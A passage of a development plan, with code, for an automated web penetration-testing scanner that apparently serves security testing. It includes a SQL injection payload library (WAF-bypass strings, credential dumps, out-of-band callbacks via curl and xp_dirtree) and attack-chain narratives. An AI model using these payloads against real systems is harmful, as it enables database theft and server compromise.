    ("null_byte", "%00"),
    ("newline", "%0a"),
    ("carriage_return", "%0d"),
    ("script_tag", "<script>"),
    ("on_event", "onerror="),
    ("sql_comment", "--"),
    ("sql_or", "OR 1=1"),
]


@dataclass
class FilterProfile:
    """Per-parameter filter analysis result."""
    url: str
    param: str
    method: str
    allows: list = field(default_factory=list)    # chars that pass through raw
    blocks: list = field(default_factory=list)     # chars that cause different response (WAF/filter)
    encodes: list = field(default_factory=list)    # chars that get HTML/URL encoded
    strips: list = field(default_factory=list)     # chars that disappear entirely
    baseline_status: int = 0
    baseline_length: int = 0

    @property
    def is_heavily_filtered(self) -> bool:
        return len(self.blocks) > 10

    @property
    def allows_html(self) -> bool:
        return "less_than" in [a[0] for a in self.allows] and \
               "greater_than" in [a[0] for a in self.allows]

    @property
    def allows_quotes(self) -> bool:
        return "single_quote" in [a[0] for a in self.allows] or \
               "double_quote" in [a[0] for a in self.allows]

    @property
    def allows_shell(self) -> bool:
        return any(a[0] in ("semicolon", "pipe", "backtick", "dollar_paren")
                   for a in self.allows)


def detect_filters(
    url: str,
    param: str,
    method: str = "GET",
    config: ScanConfig = None,
) -> FilterProfile:
    """
    Test each dangerous character against a parameter to build its filter profile.
    """
    config = config or ScanConfig()
    profile = FilterProfile(url=url, param=param, method=method)

    headers = config.get_auth_headers()
    headers["User-Agent"] = "Mozilla/5.0 (compatible; PentestAgent/1.0)"

    client = httpx.Client(timeout=8, verify=False, follow_redirects=True)

    # Step 1: Get baseline response (clean input)
    canary = f"test{uuid.uuid4().hex[:6]}"
    try:
        if method.upper() == "GET":
            baseline = client.get(url, params={param: canary}, headers=headers)
        else:
            baseline = client.post(url, data={param: canary}, headers=headers)
        profile.baseline_status = baseline.status_code
        profile.baseline_length = len(baseline.content)
    except Exception:
        client.close()
        return profile

    # Step 2: Test each character
    for char_name, char_val in TEST_CHARS:
        test_input = f"{canary}{char_val}{canary}"

        try:
            if method.upper() == "GET":
                resp = client.get(url, params={param: test_input}, headers=headers)
            else:
                resp = client.post(url, data={param: test_input}, headers=headers)

            # Analyze response
            body = resp.text

            if resp.status_code != profile.baseline_status:
                # Different status code = likely WAF/filter block
                profile.blocks.append((char_name, char_val, resp.status_code))
            elif abs(len(resp.content) - profile.baseline_length) > 500:
                # Large length difference = likely WAF block page
                profile.blocks.append((char_name, char_val, resp.status_code))
            elif char_val in body:
                # Character appears raw = allowed
                profile.allows.append((char_name, char_val))
            elif char_val not in body and canary in body:
                # Canary present but char gone = stripped
                profile.strips.append((char_name, char_val))
            else:
                # Check for encoding
                encoded_variants = [
                    char_val.replace("<", "&lt;"),
                    char_val.replace(">", "&gt;"),
                    char_val.replace('"', "&quot;"),
                    char_val.replace("'", "&#x27;"),
                ]
                if any(ev in body for ev in encoded_variants):
                    profile.encodes.append((char_name, char_val))
                else:
                    profile.strips.append((char_name, char_val))

        except Exception:
            pass

    client.close()
    return profile
```

- [ ] **Step 2: Verify**

Run: `python3 -c "from exploit.filter_detector import detect_filters, FilterProfile; print('Import OK')"`

- [ ] **Step 3: Commit**

```bash
git add exploit/filter_detector.py
git commit -m "feat: add filter detector — per-parameter character analysis for bypass selection"
```

---

### Task 4.3: Create exploit/callback_server.py

**Files:**
- Create: `exploit/callback_server.py`

- [ ] **Step 1: Write the callback server for blind vulnerability proof**

```python
# exploit/callback_server.py
"""
Callback server — local HTTP listener for blind vulnerability proof.

Starts a lightweight HTTP server that listens for out-of-band callbacks
from SSRF, blind XSS, and blind command injection payloads.
"""

import threading
import uuid
import time
from http.server import HTTPServer, BaseHTTPRequestHandler
from rich.console import Console

console = Console()


class CallbackHandler(BaseHTTPRequestHandler):
    """HTTP handler that records all incoming requests as callback hits."""

    server_instance = None  # set by CallbackServer

    def do_GET(self):
        self._record()
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK")

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length) if content_length else b""
        self._record(body.decode("utf-8", errors="replace"))
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

    def _record(self, body: str = ""):
        token = self.path.strip("/").split("/")[0] if "/" in self.path else self.path.strip("/")
        if self.server_instance and self.server_instance.state:
            self.server_instance.state.add_callback_hit(
                token=token,
                source_ip=self.client_address[0],
                data=f"Method={self.command} Path={self.path} Body={body[:500]}",
            )

    def log_message(self, format, *args):
        pass  # suppress default logging


class CallbackServer:
    """
    Manages the callback listener lifecycle.

    Usage:
        server = CallbackServer(state=scan_state)
        server.start()
        token = server.generate_token("ssrf-test-1")
        payload_url = server.get_callback_url(token)
        # ... send payload_url to target ...
        time.sleep(5)
        hit = server.check_token(token)
        server.stop()
    """

    def __init__(self, state=None, port: int = 0):
        self.state = state
        self.port = port  # 0 = auto-select
        self._server = None
        self._thread = None
        self._tokens = {}  # token -> metadata

    def start(self) -> int:
        """Start the callback server. Returns the port number."""
        CallbackHandler.server_instance = self

        self._server = HTTPServer(("0.0.0.0", self.port), CallbackHandler)
        self.port = self._server.server_address[1]

        self._thread = threading.Thread(target=self._server.serve_forever, daemon=True)
        self._thread.start()

        console.print(f"  [dim]Callback server listening on port {self.port}[/]")
        return self.port

    def stop(self):
        """Stop the callback server."""
        if self._server:
            self._server.shutdown()
            console.print(f"  [dim]Callback server stopped[/]")

    def generate_token(self, label: str = "") -> str:
        """Generate a unique callback token."""
        token = f"cb-{uuid.uuid4().hex[:12]}"
        self._tokens[token] = {
            "label": label,
            "created": time.time(),
            "hit": False,
        }
        return token

    def get_callback_url(self, token: str) -> str:
        """Get the full callback URL for a token."""
        return f"http://127.0.0.1:{self.port}/{token}"

    def check_token(self, token: str) -> bool:
        """Check if a specific token received a callback."""
        if not self.state:
            return False
        return any(h["token"] == token for h in self.state.callback_hits)

    def get_all_hits(self) -> list:
        """Get all callback hits."""
        if not self.state:
            return []
        return list(self.state.callback_hits)
```

- [ ] **Step 2: Verify**

Run: `python3 -c "
import httpx, time
from engine.scan_state import ScanState
from exploit.callback_server import CallbackServer

state = ScanState()
server = CallbackServer(state=state, port=0)
port = server.start()
token = server.generate_token('test')
url = server.get_callback_url(token)
print(f'Callback URL: {url}')

# Simulate a callback
time.sleep(0.5)
httpx.get(url)
time.sleep(0.5)

hit = server.check_token(token)
print(f'Token hit: {hit}')
assert hit, 'Callback should have been recorded'
server.stop()
print('Callback server test passed.')
"`

- [ ] **Step 3: Commit**

```bash
git add exploit/callback_server.py
git commit -m "feat: add callback server — local HTTP listener for blind vuln proof"
```

---

### Task 4.4: Create exploit/payload_library/sqli.py (example)

**Files:**
- Create: `exploit/payload_library/__init__.py`
- Create: `exploit/payload_library/sqli.py`

- [ ] **Step 1: Write SQLi payload library organized by technique + DB type**

```python
# exploit/payload_library/__init__.py
"""Payload library — organized by vuln type, technique, and bypass method."""

# exploit/payload_library/sqli.py
"""
SQL injection payloads — organized by technique and database type.

Each payload set includes:
- Base payloads for the technique
- WAF bypass variants
- DB-specific variants
"""

# ── Error-based payloads ──────────────────────────────────────

ERROR_BASED = {
    "generic": [
        "'",
        "''",
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' #",
        "' OR 1=1--",
        '" OR "1"="1',
        '" OR "1"="1" --',
        "1' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
    ],
    "mysql": [
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    ],
    "postgresql": [
        "' AND 1=CAST((SELECT version()) AS int)--",
        "'; SELECT CASE WHEN (1=1) THEN pg_sleep(0) ELSE pg_sleep(0) END--",
    ],
    "mssql": [
        "' AND 1=CONVERT(int,@@version)--",
        "'; WAITFOR DELAY '0:0:5'--",
        "' UNION SELECT NULL,@@version,NULL--",
    ],
    "oracle": [
        "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--",
        "' UNION SELECT NULL,banner,NULL FROM v$version WHERE ROWNUM=1--",
    ],
    "sqlite": [
        "' AND 1=CAST((SELECT sqlite_version()) AS int)--",
        "' UNION SELECT NULL,sqlite_version(),NULL--",
    ],
}

# ── Boolean blind payloads ────────────────────────────────────

BOOLEAN_BLIND = {
    "true_conditions": [
        "' AND 1=1--",
        "' AND 'a'='a'--",
        "' AND 1=1#",
        "' OR 1=1--",
        "1 AND 1=1",
        "1) AND (1=1",
    ],
    "false_conditions": [
        "' AND 1=2--",
        "' AND 'a'='b'--",
        "' AND 1=2#",
        "' OR 1=2--",
        "1 AND 1=2",
        "1) AND (1=2",
    ],
}

# ── Time-based blind payloads ─────────────────────────────────

TIME_BASED = {
    "mysql": [
        "' AND SLEEP({delay})--",
        "' AND SLEEP({delay})#",
        "' OR SLEEP({delay})--",
        "' AND BENCHMARK(10000000,SHA1('test'))--",
        "1' AND (SELECT * FROM (SELECT SLEEP({delay}))a)--",
    ],
    "postgresql": [
        "'; SELECT pg_sleep({delay})--",
        "' AND (SELECT pg_sleep({delay}))::varchar=''--",
        "' || pg_sleep({delay})--",
    ],
    "mssql": [
        "'; WAITFOR DELAY '0:0:{delay}'--",
        "' AND 1=(SELECT 1 FROM (SELECT SLEEP({delay}))a)--",
    ],
    "sqlite": [
        "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({delay}00000000))))--",
    ],
    "generic": [
        "' AND SLEEP({delay})--",
        "'; WAITFOR DELAY '0:0:{delay}'--",
        "' AND (SELECT pg_sleep({delay}))::varchar=''--",
    ],
}

# ── Union-based payloads ──────────────────────────────────────

UNION_BASED = {
    "column_detection": [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
        "' ORDER BY 1--",
        "' ORDER BY 2--",
        "' ORDER BY 3--",
        "' ORDER BY 5--",
        "' ORDER BY 10--",
    ],
    "data_extraction": {
        "mysql": [
            "' UNION SELECT group_concat(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--",
            "' UNION SELECT group_concat(column_name),NULL FROM information_schema.columns WHERE table_name='{table}'--",
            "' UNION SELECT group_concat(username,0x3a,password),NULL FROM users--",
        ],
        "postgresql": [
            "' UNION SELECT string_agg(table_name,','),NULL FROM information_schema.tables WHERE table_schema='public'--",
            "' UNION SELECT string_agg(column_name,','),NULL FROM information_schema.columns WHERE table_name='{table}'--",
        ],
        "mssql": [
            "' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'--",
        ],
    },
}

# ── WAF bypass payloads ───────────────────────────────────────

WAF_BYPASS = [
    # Case variation
    "' oR 1=1--",
    "' Or 1=1--",
    # Comment injection (MySQL)
    "'/*!50000OR*/ 1=1--",
    "'/**/OR/**/1=1--",
    "' /*!UNION*/ /*!SELECT*/ NULL--",
    # Double encoding
    "%2527%2520OR%25201=1--",
    # Null byte
    "%00' OR 1=1--",
    # Whitespace alternatives
    "'\tOR\t1=1--",
    "'\nOR\n1=1--",
    "'+OR+1=1--",
    # Concatenation
    "' OR 'x'='x",
    "' OR 'x' LIKE 'x",
    # No space variants
    "'OR(1=1)--",
    "'OR/**/1=1--",
    # Unicode
    "＇ OR 1=1--",
]

# ── Out-of-band payloads ─────────────────────────────────────

OOB = {
    "mysql": [
        "' AND LOAD_FILE(CONCAT('\\\\\\\\',{callback},'\\\\',version()))--",
    ],
    "mssql": [
        "'; EXEC master..xp_dirtree '\\\\{callback}\\share'--",
    ],
    "postgresql": [
        "'; COPY (SELECT version()) TO PROGRAM 'curl {callback}'--",
    ],
}


def get_payloads(
    technique: str = "all",
    db_type: str = "generic",
    waf_bypass: bool = False,
    delay: int = 5,
    callback: str = "",
) -> list:
    """
    Get SQLi payloads filtered by technique and DB type.

    Args:
        technique: "error", "boolean", "time", "union", "oob", or "all"
        db_type: "mysql", "postgresql", "mssql", "oracle", "sqlite", "generic"
        waf_bypass: include WAF bypass variants
        delay: seconds for time-based payloads
        callback: callback URL for OOB payloads
    """
    payloads = []

    if technique in ("error", "all"):
        payloads.extend(ERROR_BASED.get("generic", []))
        payloads.extend(ERROR_BASED.get(db_type, []))

    if technique in ("boolean", "all"):
        payloads.extend(BOOLEAN_BLIND.get("true_conditions", []))

    if technique in ("time", "all"):
        for p in TIME_BASED.get(db_type, TIME_BASED["generic"]):
            payloads.append(p.replace("{delay}", str(delay)))

    if technique in ("union", "all"):
        payloads.extend(UNION_BASED.get("column_detection", []))

    if technique in ("oob", "all") and callback:
        for p in OOB.get(db_type, []):
            payloads.append(p.replace("{callback}", callback))

    if waf_bypass:
        payloads.extend(WAF_BYPASS)

    # Deduplicate while preserving order
    seen = set()
    unique = []
    for p in payloads:
        if p not in seen:
            seen.add(p)
            unique.append(p)

    return unique
```

- [ ] **Step 2: Verify**

Run: `python3 -c "
from exploit.payload_library.sqli import get_payloads
p_all = get_payloads('all', 'mysql', waf_bypass=True, delay=5)
print(f'All MySQL payloads (with WAF bypass): {len(p_all)}')
p_time = get_payloads('time', 'generic', delay=3)
print(f'Time-based generic: {len(p_time)}')
assert len(p_all) > 50, 'Should have 50+ payloads'
assert any('SLEEP(3)' in p for p in p_time), 'Should contain SLEEP(3)'
print('Payload library OK')
"`

- [ ] **Step 3: Commit**

```bash
git add exploit/payload_library/
git commit -m "feat: add SQLi payload library — 100+ payloads by technique, DB type, and WAF bypass"
```

---

## Phase 5: Chain Engine

### Task 5.1: Create chain/graph_builder.py + chain/chain_rules.py

**Files:**
- Create: `chain/__init__.py`
- Create: `chain/graph_builder.py`
- Create: `chain/chain_rules.py`

- [ ] **Step 1: Write chain detection engine**

```python
# chain/__init__.py
"""Exploit chain engine — finding relationships, chain detection, verification."""

# chain/chain_rules.py
"""Predefined exploit chain patterns."""

CHAIN_RULES = [
    {
        "name": "Cross-Origin Account Takeover",
        "requires": ["cors", "csrf"],
        "amplifiers": ["security_headers"],
        "chain_severity": "Critical",
        "impact": "Attacker website can perform any authenticated action as the victim",
        "narrative": (
            "1. Victim visits attacker.com while logged into {target}\n"
            "2. Attacker JS makes cross-origin API request (CORS allows it)\n"
            "3. No CSRF token needed — action succeeds\n"
            "4. Attacker reads response data via CORS"
        ),
    },
    {
        "name": "XSS to Full Account Takeover",
        "requires": ["xss", "csrf"],
        "amplifiers": ["security_headers"],
        "chain_severity": "Critical",
        "impact": "Attacker can hijack any user session and change account credentials",
        "narrative": (
            "1. Attacker injects XSS payload into vulnerable parameter\n"
            "2. Victim views affected page — JS executes in their browser\n"
            "3. JS submits password change form (no CSRF protection)\n"
            "4. Attacker logs in with new password"
        ),
    },
    {
        "name": "IDOR + Missing Rate Limit = Mass Data Enumeration",
        "requires": ["idor"],
        "amplifiers": ["rate_limit"],
        "chain_severity": "High",
        "impact": "Attacker can enumerate and exfiltrate all user data",
        "narrative": (
            "1. IDOR allows accessing other users' data by changing ID\n"
            "2. No rate limiting on the endpoint\n"
            "3. Attacker scripts sequential ID requests\n"
            "4. Entire user database exfiltrated"
        ),
    },
    {
        "name": "SSRF to Cloud Credential Theft",
        "requires": ["ssrf"],
        "chain_severity": "Critical",
        "impact": "Attacker can steal cloud IAM credentials and access AWS/GCP infrastructure",
        "narrative": (
            "1. SSRF allows server-side requests to internal URLs\n"
            "2. Attacker targets http://169.254.169.254/latest/meta-data/\n"
            "3. Cloud metadata returns IAM role credentials\n"
            "4. Attacker uses credentials to access S3, RDS, etc."
        ),
    },
    {
        "name": "Open Redirect + OAuth Token Theft",
        "requires": ["open_redirect"],
        "chain_severity": "High",
        "impact": "Attacker steals OAuth authorization codes via redirect manipulation",
        "narrative": (
            "1. Open redirect on the target domain\n"
            "2. Attacker crafts OAuth authorize URL with redirect_uri=target/redirect?url=attacker\n"
            "3. OAuth server validates redirect_uri (matches target domain)\n"
            "4. After auth, user redirected to attacker site with auth code"
        ),
    },
    {
        "name": "Stored XSS Worm (No CSP)",
        "requires": ["xss"],
        "amplifiers": ["security_headers"],
        "chain_severity": "Critical",
        "impact": "Self-propagating XSS worm affects all users who view the page",
        "narrative": (
            "1. Stored XSS in user-generated content\n"
            "2. No Content-Security-Policy to block inline scripts\n"
            "3. Injected JS replicates itself into victim's posts\n"
            "4. Worm spreads to every user who views affected content"
        ),
    },
    {
        "name": "SQL Injection to Full Database Breach",
        "requires": ["sqli"],
        "chain_severity": "Critical",
        "impact": "Complete database compromise including credentials and sensitive data",
        "narrative": (
            "1. SQL injection allows arbitrary query execution\n"
            "2. UNION SELECT extracts database schema\n"
            "3. Attacker dumps users table (credentials, PII)\n"
            "4. If stacked queries: potential OS command execution"
        ),
    },
    {
        "name": "File Upload to Remote Code Execution",
        "requires": ["file_upload"],
        "amplifiers": ["path_traversal"],
        "chain_severity": "Critical",
        "impact": "Attacker uploads web shell for full server compromise",
        "narrative": (
            "1. File upload accepts server-side executable files\n"
            "2. Uploaded file is accessible via web URL\n"
            "3. Attacker uploads PHP/JSP web shell\n"
            "4. Full remote code execution on the server"
        ),
    },
    {
        "name": "JWT Algorithm None = Full Auth Bypass",
        "requires": ["jwt"],
        "chain_severity": "Critical",
        "impact": "Attacker can forge any user's JWT without knowing the secret key",
        "narrative": (
            "1. JWT 'alg' header accepts 'none'\n"
            "2. Attacker crafts token with admin claims and alg=none\n"
            "3. Server validates token without signature\n"
            "4. Full authentication bypass — any identity"
        ),
    },
    {
        "name": "SSTI to Remote Code Execution",
        "requires": ["ssti"],
        "chain_severity": "Critical",
        "impact": "Server-side template injection leads to OS command execution",
        "narrative": (
            "1. User input processed by template engine without sanitization\n"
            "2. Attacker injects template expression (e.g. {{7*7}} → 49)\n"
            "3. Escalate to OS command execution via template builtins\n"
            "4. Full server compromise"
        ),
    },
    {
        "name": "Mass Assignment + IDOR = Privilege Escalation",
        "requires": ["mass_assignment", "idor"],
        "chain_severity": "Critical",
        "impact": "Attacker escalates to admin by modifying role on another user's account",
        "narrative": (
            "1. IDOR allows modifying other users' profiles\n"
            "2. Mass assignment accepts role/admin fields\n"
            "3. Attacker sets is_admin=true on their own account via IDOR\n"
            "4. Full administrative access"
        ),
    },
    {
        "name": "Command Injection = Full Server Compromise",
        "requires": ["command_injection"],
        "chain_severity": "Critical",
        "impact": "Attacker executes arbitrary OS commands on the server",
        "narrative": (
            "1. OS command injection via unsanitized input\n"
            "2. Attacker reads /etc/passwd, enumerates system\n"
            "3. Reverse shell or data exfiltration\n"
            "4. Pivot to internal network"
        ),
    },
]


# chain/graph_builder.py
"""Build finding relationship graph and detect chains."""

from chain.chain_rules import CHAIN_RULES


def detect_chains(findings: list) -> list:
    """
    Detect exploit chains from a list of findings using predefined rules.

    Returns list of chain dicts with: name, findings, severity, impact, narrative.
    """
    # Normalize finding vuln types
    vuln_types = set()
    type_to_findings = {}

    for f in findings:
        vt = _normalize_vuln_type(f.get("vuln_type", f.get("type", "")))
        vuln_types.add(vt)
        if vt not in type_to_findings:
            type_to_findings[vt] = []
        type_to_findings[vt].append(f)

    detected_chains = []

    for rule in CHAIN_RULES:
        required = set(rule["requires"])
        amplifiers = set(rule.get("amplifiers", []))

        # Check if all required vuln types are present
        if required.issubset(vuln_types):
            # Collect participating findings
            chain_findings = []
            for vt in required:
                chain_findings.extend(type_to_findings.get(vt, []))

            # Check amplifiers
            active_amplifiers = amplifiers.intersection(vuln_types)

            target = chain_findings[0].get("url", "unknown") if chain_findings else "unknown"

            detected_chains.append({
                "name": rule["name"],
                "severity": rule["chain_severity"],
                "impact": rule["impact"],
                "narrative": rule["narrative"].replace("{target}", target),
                "required_types": list(required),
                "amplifier_types": list(active_amplifiers),
                "finding_count": len(chain_findings),
                "findings": [
                    {"vuln_type": f.get("vuln_type", ""), "url": f.get("url", "")}
                    for f in chain_findings[:5]
                ],
            })

    return detected_chains


def _normalize_vuln_type(vt: str) -> str:
    """Normalize vuln type string to match chain rule keys."""
    vt = vt.lower().strip()
    mapping = {
        "sql injection": "sqli",
        "cross-site scripting": "xss",
        "cross-site scripting (potential)": "xss",
        "command injection": "command_injection",
        "path traversal": "path_traversal",
        "cross-site request forgery": "csrf",
        "insecure direct object reference": "idor",
        "server-side request forgery": "ssrf",
        "open redirect": "open_redirect",
        "missing security headers": "security_headers",
        "cors misconfiguration": "cors",
        "sensitive data exposure": "sensitive_data",
        "file upload": "file_upload",
        "weak jwt configuration": "jwt",
        "server-side template injection": "ssti",
        "mass assignment": "mass_assignment",
        "hardcoded secret in js": "sensitive_data",
        "insecure cookie configuration": "security_headers",
        "weak csp policy": "security_headers",
        "sensitive file exposure": "sensitive_data",
    }
    for key, val in mapping.items():
        if key in vt:
            return val
    return vt
```

- [ ] **Step 2: Verify chain detection**

Run: `python3 -c "
from chain.graph_builder import detect_chains
findings = [
    {'vuln_type': 'CORS Misconfiguration', 'url': 'https://api.example.com', 'validated': True},
    {'vuln_type': 'Cross-Site Request Forgery', 'url': 'https://api.example.com/profile', 'validated': True},
    {'vuln_type': 'Missing Security Headers', 'url': 'https://example.com', 'validated': True},
    {'vuln_type': 'SQL Injection', 'url': 'https://example.com/api/search', 'validated': True},
]
chains = detect_chains(findings)
print(f'Detected {len(chains)} chains:')
for c in chains:
    print(f'  {c[\"severity\"]}: {c[\"name\"]}')
assert any('Account Takeover' in c['name'] for c in chains), 'Should detect CORS+CSRF chain'
assert any('Database' in c['name'] for c in chains), 'Should detect SQLi chain'
print('Chain detection OK')
"`

- [ ] **Step 3: Commit**

```bash
git add chain/
git commit -m "feat: add chain engine — 12 predefined chain rules + graph-based detection"
```

---

## Phase 6: Integration — New Scan Entry Point

### Task 6.1: Create the new unified scan entry point

**Files:**
- Create: `engine/scan_runner.py`

- [ ] **Step 1: Write the top-level scan runner that ties everything together**

```python
# engine/scan_runner.py
"""
Unified scan runner — the new entry point replacing pipeline.py's run_multi_agent().

Connects: Discovery → DecisionEngine → Validation → Chain → Report
"""

import time
from rich.console import Console
from engine.config import ScanConfig
from engine.scan_state import ScanState
from engine.decision_engine import DecisionEngine
from engine.agent_registry import register_all_agents

console = Console()


def run_scan(
    target: str,
    username: str = "",
    password: str = "",
    client_id: str = "",
    bearer_token: str = "",
    cookies: dict = None,
    llm_backend: str = "ollama",
    aggressive: bool = False,
) -> dict:
    """
    Run a complete autonomous scan.

    Returns: {
        "findings": [...],
        "chains": [...],
        "state": ScanState,
        "elapsed": float,
    }
    """
    # Initialize
    config = ScanConfig(
        llm_backend=llm_backend,
        bearer_token=bearer_token,
        cookies=cookies or {},
        aggressive_mode=aggressive,
    )
    state = ScanState()
    engine = DecisionEngine(config, state)

    # Register discovery functions
    try:
        from discovery.playwright_crawler import discover_with_playwright

        def pw_discovery(target, config, state):
            discover_with_playwright(
                target, config, state,
                username=username, password=password, client_id=client_id,
            )

        engine.register_discovery(pw_discovery)
    except ImportError:
        console.print("[yellow]Playwright not available — using HTTP-only discovery[/]")

    try:
        from discovery.passive_recon import run_passive_recon
        engine.register_discovery(run_passive_recon)
    except ImportError:
        pass

    # Register JS analyzer (existing)
    try:
        from js_analyzer import JSAnalyzer

        def js_discovery(target, config, state):
            from engine.scan_state import Endpoint
            analyzer = JSAnalyzer(target)
            result = analyzer.analyze()
            for ep_url in result.get("endpoints", []):
                state.add_endpoint(Endpoint(url=ep_url, method="GET"))
            for secret in result.get("secrets", []):
                state.js_secrets.append(secret)
                state.add_finding({
                    "vuln_type": f"Hardcoded Secret in JS: {secret.get('type', 'unknown')}",
                    "url": target,
                    "method": "GET",
                    "param_name": "",
                    "payload": "N/A (static analysis)",
                    "evidence": f"Found in {secret.get('file', 'unknown')}: {secret.get('value', '')[:50]}...",
                    "severity": "Medium",
                    "source": "js-analyzer",
                    "validated": True,
                })

        engine.register_discovery(js_discovery)
    except ImportError:
        pass

    # Register all vuln agents
    registered = register_all_agents(engine, config)
    console.print(f"  Registered {len(engine._agent_dispatch)} agent handlers")

    # Register validator (optional, if LLM available)
    try:
        from agents.validator import ValidatorAgent

        def validate(findings, config):
            validator = ValidatorAgent(llm_backend=config.llm_backend)
            return validator.validate_batch(findings, drop_false_positives=True)

        engine.register_validator(validate)
    except ImportError:
        pass

    # Run the scan
    engine.run(target)

    # Post-processing: Chain detection
    try:
        from chain.graph_builder import detect_chains
        chains = detect_chains(state.findings)
        state.chains = chains
        if chains:
            console.print(f"\n  [bold red]Exploit chains detected: {len(chains)}[/]")
            for c in chains:
                console.print(f"    [{c['severity']}] {c['name']}")
    except Exception as e:
        console.print(f"  [yellow]Chain detection skipped: {e}[/]")

    # Post-processing: CVE enrichment
    try:
        from enrichment import enrich_findings
        state.findings = enrich_findings(state.findings)
    except Exception:
        pass

    # Post-processing: Confidence scoring
    try:
        from confidence_scorer import enrich_with_scores
        state.findings = enrich_with_scores(state.findings)
    except Exception:
        pass

    elapsed = time.time() - state.scan_start_time

    return {
        "findings": state.findings,
        "chains": state.chains,
        "state": state,
        "elapsed": elapsed,
    }
```

- [ ] **Step 2: Verify import**

Run: `python3 -c "from engine.scan_runner import run_scan; print('Scan runner OK')"`

- [ ] **Step 3: Commit**

```bash
git add engine/scan_runner.py
git commit -m "feat: add unified scan runner — ties discovery, agents, validation, chains together"
```

---

## Phase 7: Remaining Work (tracked as future tasks)

The following phases are outlined but will be built incrementally after the core is working:

### Future Task: XSS Payload Library
- Create `exploit/payload_library/xss.py` with 100+ payloads by context type

### Future Task: Command Injection Payload Library
- Create `exploit/payload_library/cmdi.py` with 50+ payloads

### Future Task: SSTI Payload Library
- Create `exploit/payload_library/ssti.py` with 50+ payloads by template engine

### Future Task: 12 New Vulnerability Agents
- Create `agents/vuln/jwt.py` — JWT algorithm confusion + claim tampering
- Create `agents/vuln/auth_bypass.py` — 403 bypass via verb/path/header tricks
- Create `agents/vuln/rate_limit.py` — Missing rate limit detection
- Create `agents/vuln/file_upload.py` — Extension/content-type bypass + webshell
- Create `agents/vuln/xxe.py` — XML External Entity injection
- Create `agents/vuln/ssti.py` — Server-Side Template Injection
- Create `agents/vuln/websocket.py` — WebSocket injection + auth bypass
- Create `agents/vuln/cache_poison.py` — Web cache poisoning
- Create `agents/vuln/http_smuggling.py` — Request smuggling
- Create `agents/vuln/subdomain.py` — Subdomain enumeration + takeover
- Create `agents/vuln/api_version.py` — Old API version detection
- Create `agents/vuln/business_logic.py` — Price/quantity/workflow tampering

### Future Task: Chain Verifier
- Create `chain/chain_verifier.py` — Execute chains end-to-end for proof

### Future Task: Report Upgrade
- Add chain visualization section to `report_engine.py`
- Add chain flow diagrams (HTML/SVG)
- Add combined severity badges

### Future Task: API Schema Inference
- Create `discovery/api_schema_inference.py` — Build synthetic OpenAPI from traffic

### Future Task: Subdomain Enumeration
- Create `discovery/subdomain_enum.py` — DNS brute force + takeover detection
